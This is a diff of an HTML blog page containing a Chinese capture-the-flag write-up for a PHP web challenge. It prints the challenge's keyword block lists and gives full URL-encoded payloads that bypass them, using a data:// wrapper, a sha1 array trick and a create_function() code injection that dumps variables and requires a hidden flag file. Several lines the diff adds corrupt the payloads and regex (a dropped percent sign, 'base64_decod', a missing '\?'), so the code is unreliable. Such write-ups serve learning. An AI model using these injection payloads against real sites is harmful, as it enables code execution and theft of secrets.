@@ -193,15 +193,13 @@ on<span class="token punctuation">,</span> are disabled in php<span class="token
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
     <span class="token keyword">if</span> <span class="token punctuation">(</span>
         <span class="token function">preg_match</span><span class="token punctuation">(</span>'<span class="token operator">/</span>y1ng<span class="token operator">|</span>zuishuai<span class="token operator">|</span>flag<span class="token operator">|</span>YuZhou<span class="token operator">|</span>Wudi<span class="token operator">|</span>system<span class="token operator">|</span>exec<span class="token operator">|</span>passwd<span class="token operator">|</span>ass<span class="token operator">|</span>eval<span class="token operator">|</span>sort<span class="token operator">|</span>shell<span class="token operator">|</span>ob<span class="token operator">|</span>start
-        <span class="token operator">|</span>mail<span class="token operator">|</span>\$<span class="token operator">|</span>sou<span class="token operator">|</span>show<span class="token operator">|</span>cont<span class="token operator">|</span>high<span class="token operator">|</span>reverse<span class="token operator">|</span>flip<span class="token operator">|</span>rand<span class="token operator">|</span>scan<span class="token operator">|</span>chr<span class="token operator">|</span>local<span class="token operator">|</span>sess<span class="token operator">|</span>id<span class="token operator">|</span>source<span class="token operator">|</span>arra<span class="token operator">|</span>head<span class="token operator">|</span>light
-        <span class="token operator">|</span>read<span class="token operator">|</span>inc<span class="token operator">|</span>info<span class="token operator">|</span>bin<span class="token operator">|</span>hex<span class="token operator">|</span>oct<span class="token operator">|</span><span class="token keyword">echo</span><span class="token operator">|</span><span class="token keyword">print</span><span class="token operator">|</span>pi<span class="token operator">|</span>\<span class="token punctuation">.</span><span class="token operator">|</span>\"<span class="token operator">|</span>\<span class="token string">'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+    <span class="token operator">|</span>mail<span class="token operator">|</span>\$<span class="token operator">|</span>sou<span class="token operator">|</span>show<span class="token operator">|</span>cont<span class="token operator">|</span>high<span class="token operator">|</span>reverse<span class="token operator">|</span>flip<span class="token operator">|</span>rand<span class="token operator">|</span>scan<span class="token operator">|</span>chr<span class="token operator">|</span>local<span class="token operator">|</span>sess<span class="token operator">|</span>id<span class="token operator">|</span>source<span class="token operator">|</span>arra<span class="token operator">|</span>head<span class="token operator">|</span>light<span class="token operator">|</span>read<span class="token operator">|</span>inc<span class="token operator">|</span>info<span class="token operator">|</span>bin<span class="token operator">|</span>hex<span class="token operator">|</span>oct<span class="token operator">|</span><span class="token keyword">echo</span><span class="token operator">|</span><span class="token keyword">print</span><span class="token operator">|</span>pi<span class="token operator">|</span>\<span class="token punctuation">.</span><span class="token operator">|</span>\"<span class="token operator">|</span>\<span class="token string">'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
         <span class="token punctuation">)</span>  
         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck your key words!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 <span class="token punctuation">}</span>
 
 <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/http/i'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^y1ngzuishuai$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zuishuai'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zuishuai'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> 
-        <span class="token string">'y1ngzuishuai'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^y1ngzuishuai$/'</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zuishuai'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'zuishuai'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string">'y1ngzuishuai'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
         <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
         <span class="token keyword">echo</span> <span class="token string">"Yes! You know that I zuishuai!&lt;br>"</span><span class="token punctuation">;</span>
     <span class="token punctuation">}</span> 
@@ -226,10 +224,7 @@ on<span class="token punctuation">,</span> are disabled in php<span class="token
 <span class="token punctuation">}</span>
 
 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
-<span class="token function">preg_match</span><span class="token punctuation">(</span>'<span class="token operator">/</span>fil<span class="token operator">|</span>cat<span class="token operator">|</span>more<span class="token operator">|</span>tail<span class="token operator">|</span>tac<span class="token operator">|</span>less<span class="token operator">|</span>head<span class="token operator">|</span>nl<span class="token operator">|</span>tailf<span class="token operator">|</span>ass<span class="token operator">|</span>eval<span class="token operator">|</span>sort<span class="token operator">|</span>shell<span class="token operator">|</span>ob<span class="token operator">|</span>start<span class="token operator">|</span>mail<span class="token operator">|</span>\`<span class="token operator">|</span>
-\<span class="token punctuation">{</span><span class="token operator">|</span>\<span class="token operator">%</span><span class="token operator">|</span>x<span class="token operator">|</span>\<span class="token operator">&amp;</span><span class="token operator">|</span>\$<span class="token operator">|</span>\<span class="token operator">*</span><span class="token operator">|</span>\<span class="token operator">||</span>\<span class="token operator">&lt;</span><span class="token operator">|</span>\"<span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token operator">=</span><span class="token operator">|</span>\<span class="token operator">?</span>
-<span class="token operator">|</span>sou<span class="token operator">|</span>show<span class="token operator">|</span>cont<span class="token operator">|</span>high<span class="token operator">|</span>reverse<span class="token operator">|</span>flip<span class="token operator">|</span>rand<span class="token operator">|</span>scan<span class="token operator">|</span>chr<span class="token operator">|</span>local<span class="token operator">|</span>sess<span class="token operator">|</span>id<span class="token operator">|</span>source<span class="token operator">|</span>arra<span class="token operator">|</span>head<span class="token operator">|</span>light<span class="token operator">|</span><span class="token keyword">print</span><span class="token operator">|</span>e
-cho<span class="token operator">|</span>read<span class="token operator">|</span>inc<span class="token operator">|</span>flag<span class="token operator">|</span>1f<span class="token operator">|</span>info<span class="token operator">|</span>bin<span class="token operator">|</span>hex<span class="token operator">|</span>oct<span class="token operator">|</span>pi<span class="token operator">|</span>con<span class="token operator">|</span>rot<span class="token operator">|</span>input<span class="token operator">|</span>\<span class="token punctuation">.</span><span class="token operator">|</span>log<span class="token operator">/</span>i'<span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+<span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span>  <span class="token punctuation">)</span> <span class="token punctuation">{</span> 
     <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck you! Read my Regular Express1on!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span> 
     <span class="token keyword">include</span> <span class="token string">"flag.php"</span><span class="token punctuation">;</span>
@@ -237,9 +232,7 @@ cho<span class="token operator">|</span>read<span class="token operator">|</span
 <span class="token punctuation">}</span> <span class="token delimiter">?></span></code></pre>
 <h5 id="考点1：绕过QUERY-STRING的正则匹配"><a href="#考点1：绕过QUERY-STRING的正则匹配" class="headerlink" title="考点1：绕过QUERY_STRING的正则匹配"></a>考点1：绕过QUERY_STRING的正则匹配</h5><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
     <span class="token keyword">if</span> <span class="token punctuation">(</span>
-        <span class="token function">preg_match</span><span class="token punctuation">(</span>'<span class="token operator">/</span>y1ng<span class="token operator">|</span>zuishuai<span class="token operator">|</span>flag<span class="token operator">|</span>YuZhou<span class="token operator">|</span>Wudi<span class="token operator">|</span>system<span class="token operator">|</span>exec<span class="token operator">|</span>passwd<span class="token operator">|</span>ass<span class="token operator">|</span>eval<span class="token operator">|</span>sort<span class="token operator">|</span>shell<span class="token operator">|</span>ob<span class="token operator">|</span>star
-        t<span class="token operator">|</span>mail<span class="token operator">|</span>\$<span class="token operator">|</span>sou<span class="token operator">|</span>show<span class="token operator">|</span>cont<span class="token operator">|</span>high<span class="token operator">|</span>reverse<span class="token operator">|</span>flip<span class="token operator">|</span>rand<span class="token operator">|</span>scan<span class="token operator">|</span>chr<span class="token operator">|</span>local<span class="token operator">|</span>sess<span class="token operator">|</span>id<span class="token operator">|</span>source<span class="token operator">|</span>arra<span class="token operator">|</span>head<span class="token operator">|</span>lig
-        ht<span class="token operator">|</span>read<span class="token operator">|</span>inc<span class="token operator">|</span>info<span class="token operator">|</span>bin<span class="token operator">|</span>hex<span class="token operator">|</span>oct<span class="token operator">|</span><span class="token keyword">echo</span><span class="token operator">|</span><span class="token keyword">print</span><span class="token operator">|</span>pi<span class="token operator">|</span>\<span class="token punctuation">.</span><span class="token operator">|</span>\"<span class="token operator">|</span>\<span class="token string">'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/y1ng|zuishuai|flag|YuZhou|Wudi|system|exec|passwd|ass|eval|sort|shell|ob|star t|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|lig ht|read|inc|info|bin|hex|oct|echo|print|pi|\.|\"|\'|log/i'</span><span class="token punctuation">,</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'QUERY_STRING'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
         <span class="token punctuation">)</span>  
         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'fxck your key words!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
 <span class="token punctuation">}</span></code></pre>
@@ -291,8 +284,7 @@ $_SERVER[&quot;PHP_SELF&quot;] 当前正在执行脚本的文件名</code></pre>
 <p>因此对于需要GET的一些参数，比如<code>zuishuai</code>，只需要同时POST一个数字即可绕过：</p>
 <h5 id="考点4：绕过文件内容读取的比较"><a href="#考点4：绕过文件内容读取的比较" class="headerlink" title="考点4：绕过文件内容读取的比较"></a>考点4：绕过文件内容读取的比较</h5><pre><code>$file = &quot;1nD3x.php&quot;;
 if (!preg_match(&#39;/http/i&#39;, $_GET[&#39;file&#39;])) {
-        if (preg_match(&#39;/^y1ngzuishuai$/&#39;, $_GET[&#39;zuishuai&#39;]) &amp;&amp; $_GET[&#39;zuishuai&#39;] !== 
-        &#39;y1ngzuishuai&#39;) { 
+        if (preg_match(&#39;/^y1ngzuishuai$/&#39;, $_GET[&#39;zuishuai&#39;]) &amp;&amp; $_GET[&#39;zuishuai&#39;] !== &#39;y1ngzuishuai&#39;) { 
                 $file = $_GET[&quot;file&quot;]; 
         echo &quot;Yes! You know that I zuishuai!&lt;br&gt;&quot;;
     } 
@@ -310,29 +302,21 @@ data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4=</code></pre><p>但是本题目
 <li>y1ng是被ban掉的关键字，因此可以将<code>y1ng_YuZhou_Wudi_zuishuai</code>进行url编码后，都可以绕过。</li>
 </ol>
 <p>所以最终payload为：</p>
-<pre><code>file=data://text/plain,%79%31%6e%67%5f%59%75%5a%68%6f%75%5f%57%75%64%69%5f%7a%75%69%73%68%7
-5%61%69</code></pre><p>或者如果加上base64的话，因为<code>y1ng_YuZhou_Wudi_zuishuai</code>这个字符串进行base64编码后包含<code>ob</code>，而<code>ob</code>被正则给<code>ban</code>了，因此用base64也要url编码，payload：</p>
-<pre><code>file=data://text/plain;base64,%65%54%46%75%5a%31%39%5a%64%56%70%6f%62%33%56%66%56%33%56%6b%
-61%56%39%36%64%57%6c%7a%61%48%56%68%61%51==</code></pre><h5 id="考点5，绕过sha1比较"><a href="#考点5，绕过sha1比较" class="headerlink" title="考点5，绕过sha1比较"></a>考点5，绕过sha1比较</h5><p>题目要求<code>$y1ng</code>和<code>$passwd</code>不相等，但是他们的<code>sha1</code>要相等，如何绕过？</p>
+<pre><code>file=data://text/plain,%79%31%6e%67%5f%59%75%5a%68%6f%75%5f%57%75%64%69%5f%7a%75%69%73%68%75%61%69</code></pre><p>或者如果加上base64的话，因为<code>y1ng_YuZhou_Wudi_zuishuai</code>这个字符串进行base64编码后包含<code>ob</code>，而<code>ob</code>被正则给<code>ban</code>了，因此用base64也要url编码，payload：</p>
+<pre><code>file=data://text/plain;base64,%65%54%46%75%5a%31%39%5a%64%56%70%6f%62%33%56%66%56%33%56%6b%61%56%39%36%64%57%6c%7a%61%48%56%68%61%51==</code></pre><h5 id="考点5，绕过sha1比较"><a href="#考点5，绕过sha1比较" class="headerlink" title="考点5，绕过sha1比较"></a>考点5，绕过sha1比较</h5><p>题目要求<code>$y1ng</code>和<code>$passwd</code>不相等，但是他们的<code>sha1</code>要相等，如何绕过？</p>
 <p><code>sha1()</code>函数是无法处理数组的，如果<code>sha1()</code>的参数为一个数组会报Warning并返回False。</p>
 <p>所以只要<code>$y1ng</code>和<code>$password</code>都是数组，那么就会双双返回false，相等。</p>
 <p>数组绕过。</p>
 <p><strong>总结</strong>一下上面5个小考点的payload</p>
-<pre><code>?zuishuai=y1ngzuishuai%0a&amp;y1ng[]=1&amp;passwd[]=2&amp;file=data://text/plain,y1ng_YuZhou_Wudi_zuishu
-ai</code></pre><p>编码后为</p>
-<pre><code>?%7a%75%69%73%68%75%61%69=%79%31%6e%67%7a%75%69%73%68%75%61%69%25%30%61&amp;%79%31%6e%67%5b%5d=
-%
-31&amp;%70%61%73%73%77%64%5b%5d=%32&amp;%66%69%6c%65=%64%61%74%61://%74%65%78%74/%70%6c%61%69%6e%2c
-%79%31%6e%67%5f%59%75%5a%68%6f%75%5f%57%75%64%69%5f%7a%75%69%73%68%75%61%69</code></pre><p>别忘了Post:</p>
+<pre><code>?zuishuai=y1ngzuishuai%0a&amp;y1ng[]=1&amp;passwd[]=2&amp;file=data://text/plain,y1ng_YuZhou_Wudi_zuishuai</code></pre><p>编码后为</p>
+<pre><code>?%7a%75%69%73%68%75%61%69=%79%31%6e%67%7a%75%69%73%68%75%61%69%25%30%61&amp;%79%31%6e%67%5b%5d=%31&amp;%70%61%73%73%77%64%5b%5d=%32&amp;%66%69%6c%65=%64%61%74%61://%74%65%78%74/%70%6c%61%69%6e%2c%79%31%6e%67%5f%59%75%5a%68%6f%75%5f%57%75%64%69%5f%7a%75%69%73%68%75%61%69</code></pre><p>别忘了Post:</p>
 <pre><code>zuishuai=1&amp;file=1</code></pre><h5 id="考点6，create-function-代码注入"><a href="#考点6，create-function-代码注入" class="headerlink" title="考点6，create_function()代码注入"></a>考点6，create_function()代码注入</h5><pre><code>$arg = &#39;&#39;;
 $code = &#39;&#39;;
 if ( sha1($y1ng) === sha1($passwd) &amp;&amp; $y1ng != $passwd ){
     extract($_GET[&quot;flag&quot;]);
     echo &quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;;
 }</code></pre><pre><code>if(preg_match(&#39;/^[a-z0-9]*$/isD&#39;, $code) || 
-preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|
-\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|e
-cho|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#39;, $arg)  ) { 
+preg_match(&#39;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\{|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#39;|\=|\|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#39;, $arg)  ) { 
     die(&#39;fxck you! Read my Regular Express1on!&#39;); 
 } else { 
     include &quot;flag.php&quot;;
@@ -348,15 +332,10 @@ cho|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log/i&#39;, $arg)  ) {
 </ul>
 <p>包含了这个文件，代表可以使用里面的变量。所以要想办法在不指定变量名称的情况下输出变量的值，可以想到：<strong>是否存在一个函数，能输出所有变量的值？</strong></p>
 <p>有的！<code>get_defined_vars()</code>用来输出所有变量和值！Payload：</p>
-<pre><code>1nD3x.php?%7a%75%69%73%68%75%61%69=%79%31%6e%67%7a%75%69%73%68%75%61%69%0a&amp;%79%31%6e%67[]=
-111&amp;%70%61%73%73%77%64[]=222&amp;%70%61%73%73%77%64[]=222&amp;%66%6c%61%67[arg]=}var_dump(get_defin
-ed_vars());//&amp;%66%6c%61%67[code]=create_function&amp;file=data://text/plain,%79%31%6e%67%5f%59%
-75%5a%68%6f%75%5f%57%75%64%69%5f%7a%75%69%73%68%75%61%69
+<pre><code>1nD3x.php?%7a%75%69%73%68%75%61%69=%79%31%6e%67%7a%75%69%73%68%75%61%69%0a&amp;%79%31%6e%67[]=111&amp;%70%6173%73%77%64[]=222&amp;%70%61%73%73%77%64[]=222&amp;%66%6c%61%67[arg]=}var_dump(get_defined_vars());//&amp;%66%6c%61%67[code]=create_function&amp;file=data://text/plain,%79%31%6e%67%5f%59%75%5a%68%6f%75%5f%57%75%64%69%5f%7a%75%69%73%68%75%61%69
 POST: zuishuai=1&amp;file=1
 
-解码后：1nD3x.php?zuishuai=y1ngzuishuai
-&amp;y1ng[]=111&amp;passwd[]=222&amp;passwd[]=222&amp;flag[arg]=}var_dump(get_defined_vars());
-//&amp;flag[code]=create_function&amp;file=data://text/plain,y1ng_YuZhou_Wudi_zuishuai</code></pre><p>这里的flag.php是假flag，真的在1flag.php里</p>
+解码后：1nD3x.php?zuishuai=y1ngzuishuai&amp;y1ng[]=111&amp;passwd[]=222&amp;passwd[]=222&amp;flag[arg]=}var_dump(get_defined_vars());//&amp;flag[code]=create_function&amp;file=data://text/plain,y1ng_YuZhou_Wudi_zuishuai</code></pre><p>这里的flag.php是假flag，真的在1flag.php里</p>
 <h5 id="考点8，得到真正的flag-不适用于BJDCTF"><a href="#考点8，得到真正的flag-不适用于BJDCTF" class="headerlink" title="考点8，得到真正的flag (不适用于BJDCTF)"></a><strong>考点8，得到真正的flag (不适用于BJDCTF)</strong></h5><p>我们可以继续通过刚刚的方法，就是<code>get_defined_vars()</code>，得到1flag.php的变量的值，但是前提是需要包含1flag.php。</p>
 <p>现在的困难：</p>
 <ul>
@@ -371,17 +350,10 @@ POST: zuishuai=1&amp;file=1
 <li>过滤了flag，可以base64编码。其他过滤的不用便是</li>
 </ul>
 <p>Payload：</p>
-<pre><code>/1nD3x.php?%7a%75%69%73%68%75%61%69=%79%31%6e%67%7a%75%69%73%68%75%61%69%0a&amp;%79%31%6e%67[]=
-111&amp;%70%61%73%73%77%64[]=222&amp;%70%61%73%73%77%64[]=222&amp;%66%6c%61%67[arg]=}require(base64_dec
-ode(MWZsYWcucGhw));var_dump(get_defined_vars());//&amp;%66%6c%61%67[code]=create_function&amp;file=
-data://text/plain,%79%31%6e%67%5f%59%75%5a%68%6f%75%5f%57%75%64%69%5f%7a%75%69%73%68%75%61%
-69
+<pre><code>/1nD3x.php?%7a%75%69%73%68%75%61%69=%79%31%6e%67%7a%75%69%73%68%75%61%69%0a&amp;%79%31%6e%67[]=111&amp;%70%6173%73%77%64[]=222&amp;%70%61%73%73%77%64[]=222&amp;%66%6c%61%67[arg]=}require(base64_decode(MWZsYWcucGhw));var_dump(get_defined_vars());//&amp;%66%6c%61%67[code]=create_function&amp;file=data://text/plain,%79%31%6e%67%5f%59%75%5a%68%6f%75%5f%57%75%64%69%5f%7a%75%69%73%68%75%61%69
 POST: zuishuai=1&amp;file=1
 
-解码后:/1nD3x.php?zuishuai=y1ngzuishuai
-&amp;y1ng[]=111&amp;passwd[]=222&amp;passwd[]=222&amp;flag[arg]=}require(base64_decode(MWZsYWcucGhw));
-var_dump(get_defined_vars());//&amp;flag[code]=create_function&amp;file=data://text/plain,y1ng_YuZh
-ou_Wudi_zuishuai</code></pre><pre><code>核心部分：require(base64_decode(MWZsYWcucGhw));</code></pre><p>MWZsYWcucGhw解码后为1flag.php。另外<code>base64_decode(&quot;MWZsYWcucGhw&quot;)</code>把引号去掉也是可以的，所以能够bypass引号过滤。</p>
+解码后:/1nD3x.php?zuishuai=y1ngzuishuai&amp;y1ng[]=111&amp;passwd[]=222&amp;passwd[]=222&amp;flag[arg]=}require(base64_decod(MWZsYWcucGhw));var_dump(get_defined_vars());//&amp;flag[code]=create_function&amp;file=data://text/plain,y1ng_YuZhou_Wudi_zuishuai</code></pre><pre><code>核心部分：require(base64_decode(MWZsYWcucGhw));</code></pre><p>MWZsYWcucGhw解码后为1flag.php。另外<code>base64_decode(&quot;MWZsYWcucGhw&quot;)</code>把引号去掉也是可以的，所以能够bypass引号过滤。</p>
 <p>真的学到很多。</p>
 
             </div>
